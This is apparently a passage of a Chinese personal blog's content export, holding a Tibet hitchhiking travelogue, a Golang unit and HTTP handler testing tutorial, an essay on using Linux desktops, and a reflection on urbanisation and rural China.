      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>那些年，318徒步搭车之旅（一）</title>
    <url>/2020/life/walk-on-the-318-road.html</url>
    <content><![CDATA[<p>那是2015年8月，我在拉萨停留几日，期间逛了下<code>大昭寺、布达拉宫门口</code>等打卡地点，作为一个非宗教人士，我对拉萨的这些宗教文化并无太多感触，也并不觉得灵魂有什么升华。大街上的商店大部分也都是卖着义乌批发制品，他们的售卖对象其实不是游客，而且来自西藏各地的牧民，但我花了100多买了一双山地运动鞋，扔掉了我脚上穿的特步运动鞋，这双运动鞋我在外穿了几个月，虽然也很便宜但是非常轻便，但是过于轻薄，因为我在策划一场没有安排和计划的318之旅，从拉萨坐火车往回走太远，不如走国道再去云南大理转转。</p>
<blockquote>
<p>后记，那双鞋质量很差，差的突破预期。。。</p>
</blockquote>
<a id="more"></a>

<img src="/images/2020-02-12-1.jpeg" /> 

<div align="center">
    <audio controls autoplay loop>
      <source src="/audios/fzw.mp3" type="audio/mpeg" >
    </audio>
</div>

<p>说走就走，第一站是<code>林芝市</code>，早上我告别青旅，坐车前往距离拉萨几十公里外的一个县（墨竹工卡县），等等，不是说好的徒步搭车吗？其实我在外一般能坐车的地方肯定是自己坐车，极少去坐“黑车”或者搭车。但是西藏这个地方客运车辆很少，有些地方根本不通车，或者车次非常少（有些地区1-2天才发一趟车）。在国道上跑的车一类是大货车，大多都是从云南四川过来的货运车辆，珍惜生命远离大货车；另一类是私家车，以川字牌居多，其中大部分都是自驾游或者租的车，也有不少是藏族人当地车，还有部分以盈利为目的的“黑车”。</p>
<img src="/images/2020-02-12-2.jpeg" /> 

<p>大约中午的时候才到达了这个县，说是县城，但规模比我国中东部地区的一个镇都还小，基本上就是沿着国道2边有一些房子，路边商店买了一瓶水，望了望这街道，再看了下地图我离林芝还有300多公里。。。我决定开始搭车了。第一次搭车没什么经验，站路边招手半天没人停，也记不清大概过了多久，有一辆车停了，直接招呼我上车，车上有很多藏族人，车主的普通话很糟糕，我觉得大概是在问我去哪里，我说去林芝，也不知道他听懂了没，后面就一直没交流过，车上这些人说话我也听不懂，也没和我搭话，我自顾自刷着手机，中间路过<code>米拉山口</code>下来拍了张照，第一次在海拔这么高的地方，感觉脑袋有点懵，腿有点软，也不知道是不是因为坐的太久了。。。</p>
<blockquote>
<p>米拉山口是318国道海拔最高点，5000多米，当时下面已经在修隧道了，现在估计早已经修好了。其实318国道那几年到处都在架桥修隧道，路况好很多，现在估计随便一个车也能开过去。</p>
</blockquote>
<img src="/images/2020-02-12-3.jpeg" /> 

<p>大概5点多的时候，车子到了国道旁一个像是镇的地方，那块有一个岔路口，往前走是318，拐进去不知道是什么地方，看地图里面也没什么县或镇，估计这些藏族人家在深山。车上人都下来休息，这时候车主和我说，他们不往前面走了，要拐进去，离林芝也不远了，让我自己在路边再拦个车，最后让我让把<code>路费</code>付一下。其实付路费这事我觉得没啥问题，毕竟上车那会也没说不要钱，现在回忆起来也记不清楚是他到底开口要了多少钱，反正我记得我那会还还价了，最后给了100块外加一些零钱，可能不合他意，但是他也没做出什么出格的举动，因为那会我兜里也就踹了几百块钱，自己总得留点，再多要我确实也没有。</p>
<p>然而这里距离这个林芝还有100多公里，路边已经基本上没有什么车了，再过1个多小时天也快黑了。我进镇看了下，这个镇也很小，不过好在还有旅店和饭店，于是背着包在镇里面过了一遍，然后又回到了318国道，最后决定还是继续往前，先往前走着一边再搭车，如果实在搭不到车那就再往回走晚上住这里。</p>
<img src="/images/2020-02-12-4.jpeg" /> 

<p>这次运气比较好，很快就有一辆川字牌的车停下来了，车主是不是藏族人，上车后发现车子非常新，连后座的膜都还在，简单聊了几句，他说他是去云南送车的，让我不要动车上的东西，具体我也没多问。不过这大哥的车技确实了得，318上面弯道非常多，很多地方道路也不宽敞，但是这大哥每次转弯、会车的时候甚至都不用减速。虽然这次语言不是障碍，但是2个大老爷们也没什么太多可聊的，最后晚上9点多的时候到了林芝，我说了声谢谢后就下了车，这大哥什么也没说啥，一脚油门就走了，颇有几分干练和爽快。</p>
<p>虽然有点折腾，但是最终还是到达林芝市，迈出了318国道的第一步，万事开头难，谁知道接下来又会发生什么呢？</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang测试用例编写</title>
    <url>/2020/coding/golang/unit-and-functional-test.html</url>
    <content><![CDATA[<p>如果你看过很多开源库的源码，你会发现大部分项目都有很多详细的测试代码，一般来说测试覆盖率越高说明这个项目的质量越高，所以好的项目测试是少不了的。很多公司对代码测试覆盖率也有要求，不为别的，只为更好的代码质量。</p>
<h2 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类"></a>1.分类</h2><p>虽然业界有一直开发模式叫做测试驱动开发（TDD），但是了解的人都知道<code>TDD</code>对开发要求太高了，它要求你先写测试用例然后再写代码，需要你写代码之前思考很多，需要大量时间，我实际开发中并没有采用过这种模式，估计国内都应该很少。</p>
<p>我们可以粗略的把测试用例简单划分为2种类型，一种是<code>单元测试</code>，它是针对某个模块、函数、方法的测试，另一种是<code>功能测试（集成测试）</code>，它是针对整个项目功能是否可用的测试。举个例子，你写个了Web服务接口，单元测试可能是针对这个接口里面调用的一个函数测试，而功能测试就是测试这个接口是否可用，因为一个接口可能调用了多个函数。</p>
<h2 id="2-单元测试"><a href="#2-单元测试" class="headerlink" title="2.单元测试"></a>2.单元测试</h2><p>Golang里面的测试和其它大部分语言的测试不多，只不过表示形式略有不同，比如Go的单元测试通常情况下是和被测试的代码放在一起的，以<code>xxx_test.go</code>命名并且测试的函数名必须以<code>Test</code>开头。</p>
<a id="more"></a>

<p>例如：<br>math.go 有以下2个函数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"errors"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Div</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, errors.New(<span class="string">"division by zero"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a / b, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果想测试这个文件，那么测试文件名字就应该叫 math_test.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestDiv</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    i, err := Div(<span class="number">4</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        t.Fail()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">2</span> &#123;</span><br><span class="line">        t.Fail()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>切换到工作目录下执行 <code>go test</code>即可，这个命令有很多附加参数，比如说<code>-v</code>可以查看详细情况，<code>-coverprofile</code>可以看测试覆盖率。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jun:~&#x2F;Documents&#x2F;Work&#x2F;test$ go test -v -coverprofile&#x3D;c.out</span><br><span class="line">&#x3D;&#x3D;&#x3D; RUN   TestDiv</span><br><span class="line">--- PASS: TestDiv (0.00s)</span><br><span class="line">PASS</span><br><span class="line">coverage: 66.7% of statements</span><br><span class="line">ok      _&#x2F;home&#x2F;jwang&#x2F;Documents&#x2F;Work&#x2F;test       0.001s</span><br></pre></td></tr></table></figure>

<p>根据测试函数参数类型的不同，Go里面把测试又细分为<code>*testing.T和*testing.B</code>，其实B是性能基准测试，通常用来测试算法性能，这里就不多说了。</p>
<p>单元测试的目的就是尽可能的覆盖到所有情况，说白了，就是枚举各种情况，根据输入的参数人工推导正确的结果，然后和实际得出的结果做比对，如果失败则说明程序有bug，比如上面的例子明显没有覆盖到所有情况，只达到了66.7%。</p>
<p>上面这段测试代码主要是没有覆盖到被除数为0的情况，下面完善一下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestDiv</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    i, err := Div(<span class="number">4</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        t.Fail()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">2</span> &#123;</span><br><span class="line">        t.Fail()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i, err = Div(<span class="number">4</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">        t.Fail()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新执行<code>go test</code>会发现覆盖率达到了100%，也就是所有语句都覆盖到。</p>
<blockquote>
<p>请注意，覆盖率达到100%并不意味着代码没有问题。</p>
</blockquote>
<h2 id="3-表格测试"><a href="#3-表格测试" class="headerlink" title="3.表格测试"></a>3.表格测试</h2><p>表格测试严格来说并不是一种测试类型，只是一种测试方式，就是一种套路，上面的例子里面，我们需要手动构造每一个测试的入参和出参后执行、断言结果，有很多重复代码，我们可以使用表格测试优化一下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestDiv</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> tests = []<span class="keyword">struct</span> &#123;</span><br><span class="line">        a        <span class="keyword">int</span></span><br><span class="line">        b        <span class="keyword">int</span></span><br><span class="line">        expected <span class="keyword">int</span></span><br><span class="line">        err      error</span><br><span class="line">    &#125;&#123;</span><br><span class="line">        &#123;<span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="literal">nil</span>&#125;,</span><br><span class="line">        &#123;<span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="literal">nil</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="literal">nil</span>&#125;,</span><br><span class="line">        &#123;<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, DivisionByZeroError&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> tests &#123;</span><br><span class="line">        i, err := Div(v.a, v.b)</span><br><span class="line">        <span class="keyword">if</span> i != v.expected || err != v.err &#123;</span><br><span class="line">            t.Errorf(<span class="string">"input %d, %d, expected %d, got %d"</span>, v.a, v.b, v.expected, i)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方式比较简洁，参数一目了然，而且方便扩展添加新的用例，这里需要注意一下那个error，可以先定义一个自定义的error方便判断，同时使用了<code>t.Errorf</code>格式化入参和出参方便排查错误。</p>
<blockquote>
<p>为了更方便的断言结果，我们可以使用第三方的assert库，Github上面也有很多开源的测试库，可以简化你的操作，更快速的编写测试用例。</p>
</blockquote>
<h2 id="4-功能测试"><a href="#4-功能测试" class="headerlink" title="4.功能测试"></a>4.功能测试</h2><p>功能测试就和你用Postman去测试一样，我们需要把这个服务启动起来，然后模拟用户的操作，去测试结果是否符合预期。测试本身是个非常广泛的话题，有很多种方式，这里我只说说平时用的比较多的Http服务的接口测试。</p>
<p>首先，我们需要了解一下Go里面Http服务的创建方式，最简单的方式莫过于下面这种：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">    <span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">"/div"</span>, DivHandler)</span><br><span class="line">    _ = http.ListenAndServe(<span class="string">":8888"</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DivHandler</span><span class="params">(writer http.ResponseWriter, request *http.Request)</span></span>  &#123;</span><br><span class="line">    a := request.PostFormValue(<span class="string">"a"</span>)</span><br><span class="line">    b := request.PostFormValue(<span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line">    paramA, _ := strconv.Atoi(a)</span><br><span class="line">    paramB, _ := strconv.Atoi(b)</span><br><span class="line"></span><br><span class="line">    i, err := Div(paramA, paramB)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        _, _ = writer.Write([]<span class="keyword">byte</span>(<span class="string">"error"</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    _, _ = writer.Write([]<span class="keyword">byte</span>(strconv.Itoa(i)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码就是使用了Go自带的http库创建了一个Web服务，它提供了一个接口，功能和之前的函数一样，如果出错的话就返回error。</p>
<p>我们可以使用Go的一个http recorder对这个http服务进行测试，方法如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">    <span class="string">"net/http/httptest"</span></span><br><span class="line">    <span class="string">"net/url"</span></span><br><span class="line">    <span class="string">"strings"</span></span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestDivHandler</span><span class="params">(t *testing.T)</span></span>  &#123;</span><br><span class="line">    recorder := httptest.NewRecorder()</span><br><span class="line"></span><br><span class="line">    params := url.Values&#123;&#125;</span><br><span class="line">    params.Add(<span class="string">"a"</span>, <span class="string">"42"</span>)</span><br><span class="line">    params.Add(<span class="string">"b"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">    request, _ := http.NewRequest(<span class="string">"POST"</span>, <span class="string">"/div"</span>, strings.NewReader(params.Encode()))</span><br><span class="line">    request.Header.Add(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line"></span><br><span class="line">    DivHandler(recorder, request)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> recorder.Result().StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">        t.Error(<span class="string">"Test failed"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    body, _ := ioutil.ReadAll(recorder.Result().Body)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">string</span>(body) != <span class="string">"21"</span> &#123;</span><br><span class="line">        t.Error(<span class="string">"Test failed"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个测试用例里面，我主要测试了2点，一个是返回码是不是200，另外测试了一下正常的返回结果。不过很明显，我这里并没有覆盖到异常情况。</p>
<p>很多Go的Web框架，比如Beego和Gin，框架本身会多一层路由，但是测试方式大同小异，主要还是使用http recorder来实现，这里就不多说了。</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这里介绍的只是最简单测试方式，实际开发中想要完全做好测试还有很多问题，比如有些系统有很多外部依赖，在测试的时候可能还要借助于mock。再比如有很多Web服务还涉及到数据库层，想要完整测试还要做好数据回滚。</p>
<p>国内很多公司对测试要求并不严格，很多公司都不要求写测试，有些虽然有测试覆盖率要求，但是也是为了应付（代码都写完了，后面再加测试也就图个心理安慰），测试用例并无法保证代码质量，我觉得真正想提高代码质量还是得靠<code>code review</code>。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>你是否真的需要使用Linux？</title>
    <url>/2020/linux/do-you-need-linux.html</url>
    <content><![CDATA[<p>自从跨入IT编程行业一直都在使用Linux桌面系统办公（尝试过挺多发行版，最终选择Ubuntu），平时生活也在用，不知不觉已经4年多了，也安利了身边很多人使用Linux，从最早的疯狂折腾到现在追求稳定，其实也颇有感触，闲来无事聊一聊。</p>
<p>我和很多人一样，最早接触的都是<code>Windows</code>系统的电脑，我也一度是Windows的爱好者，记得当年还对XP、IE情有独钟，装系统、优化系统这些事情当年也没少做，也没少折腾，基本上到了打开任务管理器，对里面每一个进程的作用以及关闭某个进程会导致什么问题都了解的地步。而当时我对Linux的印象也停留在黑框框上面，觉得很神秘，对技术要求很高，只在很多电影里面看见黑客会用到，毕竟那会我对OS需求只是到用的地步，并没有接触编程开发。</p>
<img src="/images/2020-02-10-1.jpeg" /> 

<a id="more"></a>

<p>实际上，踏入编程行业之后，我发现很多教学教程用的还是Windows居多，或者是Mac OS，使用Linux的人还真不多，那会我无意间了解到一个叫<code>Kali</code>的系统，了解这个系统的都知道，Kali这个系统是专门用于<code>安全渗透测试</code>，它开箱自带了很多非常有用的工具，比如说可以用于制作木马、中间人攻击、钓鱼、抓包破解WiFi等等，我最初也是因为对黑客比较感兴趣才会去使用这个系统。具体的话我在另一篇文章说到，我拿Kali做了很多有意思的事情，不过后来渐渐就不用了，毕竟我从事的不是IT网络安全行业。</p>
<p>我最早使用Ubuntu的时候，那会的版本使用的还是unity桌面，我个人非常喜欢这个桌面，但是Ubuntu 18.04之后的版本换成gnome了。目前我依然坚持使用unity的一个原因就是unity桌面的沉浸式状态栏非常好看，其次unity桌面的颜值很高，另外就是习惯了，毕竟用了好几年了，可惜被官方抛弃了。</p>
<img src="/images/2020-02-10-2.png" /> 

<p>大约2年前，我建了一个Ubuntu桌面的交流QQ群(<code>群号: 541114553</code>)，那会只有几个人，后来一直也没打理，没想到最近半年陆续有很多人申请加入，现在已经有100多人了。</p>
<img src="/images/2020-02-10-3.png" /> 

<p>但是我发现加群的人大部分都是小白，都是来问问题的，问的最多的问题都是关于安装的问题。诚然，Linux系统的安装确实是个头疼的事情，特别是在有独显的机器上面，可能还涉及到硬件驱动兼容性问题。有时候并不是我不想回答问题，只是有些问题完全是可以搜索解决的，只是很多伸手党懒的去研究，我在不同机器上面安装Linux的次数没有上百次也有几十次了，也安装过双系统，包括黑苹果双系统，折腾系统很多年，什么样的问题都遇到过，所以我这里总结一下解决问题的思路：</p>
<ul>
<li><p>首先，准确的描述报错问题。很多人在遇到问题之后搜索都不会，主要是因为不知道如何表达。有些人说自己英文太差，看不懂报错。。。也有人说报错太多，不知道哪地方是重点。</p>
</li>
<li><p>其次，先<code>百度|Google</code>一下，99%的问题网上都有答案，就看你会不会搜索。英文确实很主要，Google搜出来的很多都是英文的，如果你看不懂那确实有点难，毕竟翻译有时候并不准确。</p>
</li>
</ul>
<img src="/images/2020-02-10-4.png" /> 

<ul>
<li><p>然后，提问的艺术。提问要准确描述你要干什么？、你遇到的问题？、然后最好附上截图或者视频。</p>
</li>
<li><p>最后，既然选择使用Linux，就一定要有耐心和动手能力，我最早折腾Linux，不知道重复安装了多次，每次折腾挂了就重新安装。如果不想折腾，可以出门右转Windows或者Mac。</p>
</li>
</ul>
<p>针对大家遇到的Linux安装问题，我这里说一下常见的问题点：</p>
<ul>
<li><p>BIOS，建议关闭安全启动和快速启动，有些电脑<code>BIOS</code>里面有很多是为Windows优化的。如果你连BIOS是什么都不清楚，回去补功课吧。</p>
</li>
<li><p>显卡驱动，N卡对Linux的支持比较烂，但是英特尔家的集显还是比较好。如果安装有问题，可以尝试屏蔽独显，笔记本可能需要在BIOS里面调，台式机可以在<code>grub</code>加启动安装参数，具体的百度，在安装完成进系统之后再单独安装驱动。</p>
</li>
<li><p>硬件驱动，某些比较新的笔记本有些硬件，比如无线网卡，蓝牙可能没驱动，Linux的驱动都在内核里面，如果不支持你有2种选择，一种是查一查最新的内核有没有带驱动，如果有那可以升级内核。另一种是查看该硬件官网是否有单独的Linux驱动提供下载，如果有可以自己编译安装。</p>
</li>
<li><p>双系统，建议先安装Windows然后再安装Linux，很多发行版可以检测到你安装了Windows，所以在你安装Linux的时候可以保留Windows，自动变成双系统。而Windows安装则不会管你Linux，它会覆盖掉，虽然后面也可以通过修复引导等方式解决，不过很麻烦。</p>
</li>
</ul>
<p>最后，我想说一个比较重要的话题，那就是你为什么要使用Linux？</p>
<p>首先，我不建议非IT行业从事者使用Linux，操作系统本质上只是一个工具，大部分非IT技术行业者可能只是好奇，但他们没有相关技术能力解决一些问题，他们可以选择更好用的面向消费者的Windows或Mac，少折腾多花点时间放在工作上会更好。</p>
<img src="/images/2020-02-10-5.png" />

<p>本人使用Ubuntu原因主要有下面几点：</p>
<ul>
<li><p>编程开发方便，无论是工具还是环境，Linux对编程都非常友好，这一点不用质疑。有人说使用Linux的人到最后都会转向Mac，我旁边确实有人是这样，但是我觉得我不会。Mac的操作习惯是反人类的，我曾经在黑苹果上面尝试过一段时间，最终还是没有坚持下去。</p>
</li>
<li><p>渲染效果，特别是高DPI下，Linux的渲染效果和Mac是同一个级别的，毕竟都是类Unix系统。建议有条件的童鞋可以换个4k屏幕，效果非常出众。</p>
</li>
<li><p>流氓软件少，Linux下很多国产软件也安分很多，比如搜狗输入法、WPS、网易云音乐都没有弹窗广告，也不会开机自启。另外，各种木马病毒也少很多，我用了这么多年从来没遇到过。</p>
</li>
</ul>
<p>如果非得说缺点，就是打不了游戏，虽然steam也有Linux版本，但是支持的游戏少，也就Dota2比较出名。我是安装的双系统，只有玩游戏会切换到Windows。</p>
<p>从国内Linux生态圈来说，最近几年确实好很多，主要是政策原因，很多软件纷纷推出Linux版本，比如百度网盘、QQ，但是诚意不足，很多都是拿Web端套个壳，要不然就是功能简陋。虽然总体上说Linux依然是少数人使用的系统，但是这并不妨碍Linux的发展，毕竟Linux不仅仅是工具，更是一种<code>自由</code>软件的信仰！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>谈谈城市化和农村现状</title>
    <url>/2020/life/city-and-county.html</url>
    <content><![CDATA[<blockquote>
<p>此次疫情爆发，有人说现在农村最安全，因为农村一般都是自建房，分布零散，而城市里面都在小区里面，住在火柴盒一样的格子楼里面，进出同一个楼道，同一个电梯，被感染的几率大很多。</p>
</blockquote>
<p>我从小在农村长大，自始至今，依然是个农村人（户口还在农村），大学之后，基本上都在城里面上班工作，但是过年还是在老家。有时候早上还在车水马龙、遍布高楼大厦的城里面，晚上就来到了农村蛙声一片的田野边，一个是现代化的城市，另一个是传统的农村，感触十分之深。</p>
<p>今天我就聊聊我一些关于农村和城市的事和想法，可能比较零散，纯属回忆！</p>
<a id="more"></a>
<div align="center">
    <audio controls autoplay loop>
      <source src="/audios/ahq.mp3" type="audio/mpeg" >
    </audio>
</div>

<h2 id="一样的经历"><a href="#一样的经历" class="headerlink" title="一样的经历"></a>一样的经历</h2><p>我在农村长大这些年的时光几乎和很多农村人一样，曾经也住过土房子，经常下河抓鱼摸虾，插过秧也种过地。。。很多和我年龄一样大但是在城里长大的孩子肯定没有经历过，但是或许他们父母（也可能是爷爷奶奶）经历过。</p>
<p>有趣的是，相对于和我同龄的人，我们虽然年龄相同但是经历不同，但我和他们父母虽然不在一个年龄段却可能拥有相同的经历。我相信，即使在2020年的今天，中国依然有很多孩子留守在农村，过着和我20年前差不多一样的农村生活。</p>
<h2 id="房地产市场化"><a href="#房地产市场化" class="headerlink" title="房地产市场化"></a>房地产市场化</h2><p>从农村到城市，这样的过程依然在很多地方进行着，只不过不同人可能处于不同的阶段，有些人可能在30年前就完成了这个过程。</p>
<p>有人说现在很多的城里人以前也是农村人，确实是这样，中国的城市化的快步发展很大程度上得益于国家政策的变化，也就是房地产市场化，开放城市落户，差不多是最近20年才完成的事情。我们盖了大概可以容纳30亿人的房子，全民都在买房、炒房，房子成为每个人最值钱的财产。</p>
<h2 id="落寞的小洋楼"><a href="#落寞的小洋楼" class="headerlink" title="落寞的小洋楼"></a>落寞的小洋楼</h2><p>我记得我上小学初中的时候那会，大约在03年左右，农村都在盖自建房以代替之前的土瓦房，那会很流行盖“小洋楼”，一般多为2-3层的楼房，现在你去农村看看还有很多，大部分都荒废了，因为农村根本没人了，即使现在农村几乎家家都有水泥路，有些地方甚至都通了自来水，光纤网络，虽然基础设施建设并不差，但是没人愿意住农村。</p>
<p>我在想，那会为什么没有人去城里买房呢？那会估计房子几百块一平方米就可以吧？</p>
<img src="/images/2020-02-07.jpeg" /> 

<p>其实并不是他们不想买，是因为根本买不到，我不知道中国房地产正式市场化具体时间点是什么时候，但是我肯定那会你在城里面买不到房子，也落不了户口，孩子更上不了学。</p>
<h2 id="割裂的家族"><a href="#割裂的家族" class="headerlink" title="割裂的家族"></a>割裂的家族</h2><p>农村有很多小村庄，一个村里面的基本上都是亲戚，毕竟那会兄弟姐妹很多，我有一个大伯，早年当兵，部队退伍之后给安排在省会，之后他们那一岔全部都在城里面发展了，他的子女就是原生的城里人了。早些年，村里老一辈在世的时候有时候还会回农村过年，清明节也会回家祭祖，小时候他们经常回来带着胶卷相机给我们拍照。</p>
<p>在农村，传统的血缘关系家族早已分崩离析，有钱的亲戚基本上都进了城，更有钱的甚至出了国，没钱的还在农村，久而久之就不联系了。即便现在网络通信发达，动动手指就能聊天视频，也懒的去问候寒暄。</p>
<p>传统的大家族时代一去不复返，现在很多人只生1个子女，慢慢在一个城市生根发芽，会逐渐演变成小家族（家庭）时代，我觉得这个重组的过程大约需要2代人吧。</p>
<blockquote>
<p>城里人亲戚基本上都在一个城市，而很多农村人的亲戚基本上遍布全国，这大概就是相濡以沫，不如相忘于江湖。</p>
</blockquote>
<h2 id="无处安放的土地"><a href="#无处安放的土地" class="headerlink" title="无处安放的土地"></a>无处安放的土地</h2><p>有些人可能不知道种地一年能挣多少钱，更不知道农业税有多重。我家以前大概分了10亩地，我记得忙活一年收的稻谷大概能卖5000块钱，其中农业税大概需要2000块钱。事实上，农业税只是统称，那会农村的税目不比现在企业的少，其中包括修路修桥、水利等很多类目。</p>
<p>在我上小学的时候，那些年农业税征收是政府的大事，每年秋收之后，田野间经常能看到浩浩荡荡的村干部一行十几人，挨家挨户催收。有些村民远远看见村干部来了，会关门出去躲开，但也有硬碰硬的，经常发生打架事件，村干部被打伤打死的事情时有发生。</p>
<p>那时候官民关系非常紧张，我亲眼所见，我叔的稻谷被村干部找来收粮人“强行”卖掉拿来交税（一般稻谷春季价格高一点，所以很多人会留着不卖），你不卖村干部帮你忙，卖了还帮你数钱，多的还你，比劫匪好一点。</p>
<blockquote>
<p>那时候中国工业刚刚起步，政府用农业补贴工业，对农民的压榨太狠了，后来工业差不多发展起来了，最终取消了农业税。</p>
</blockquote>
<p>为什么没人愿意种地？原因其实很简单，水稻小麦的价格是由政府定的（传说中的指导价），这个定价基本上是不让你饿死就行了，现在你随便去城里打工，一年收入也有好几万，你会为了几千块在家种地吗？</p>
<h2 id="农场主制度"><a href="#农场主制度" class="headerlink" title="农场主制度"></a>农场主制度</h2><p>现在农村的土地大部分都是承包给个人种植了，也就是说传说中的农场主制，不过这和美国的农场主差远了。土地大规模承包确实有利于机械化种植，发挥规模效益，但是其实很有限。很多地方连农场主都不想干了，土地就荒废了，原因很简单，也挣不了多少钱，一方面粮食价格国家控制，另一方面农药化肥价格是市场控制，作为种地的人，你什么都控制不了，连收成还得看天。</p>
<h2 id="消失的村镇"><a href="#消失的村镇" class="headerlink" title="消失的村镇"></a>消失的村镇</h2><p>这几年在农村过年晚上放烟花的人越来越少，农村基本上已经没人了，城里还不给放，印象中农村过年烟花放的最多的时候大约在05年左右，那会晚上农村还很热闹。</p>
<p>在农村有很多村和镇，有些地方逐渐发展壮大，有些地方逐渐消失，发展一个县城可能要吸引下面几十个乡镇的人口迁移，如果不这样做，那么多房子卖给谁呢？</p>
<p>但是光把房子盖起来，没有配套的工作，买了房又有什么用？这是很多三四线城市面临的问题</p>
<h2 id="房子还是公寓？"><a href="#房子还是公寓？" class="headerlink" title="房子还是公寓？"></a>房子还是公寓？</h2><p>在美国，一般说房子（house），是指那种带院子的独栋建筑，而中国所说的房子其实在美国一般被称为公寓（department），也就是格子房。在中国也有房子，不过一般都是别墅，很多大城市郊区都遍布了大规模的别墅群，但是和美国比还是差远了，而中国农村的自建房其实也可以算是别墅的一种。</p>
<p>如果你用过Google的卫星地图，你可以看看美国的城市，你会发现美国的城市规模非常之大，全部都是独栋建筑，很少有类似中国的高层小区。所以很多人戏称美国是大农村，没毛病，和中国农村差不多。</p>
<img src="/images/2020-02-07-2.jpeg" /> 

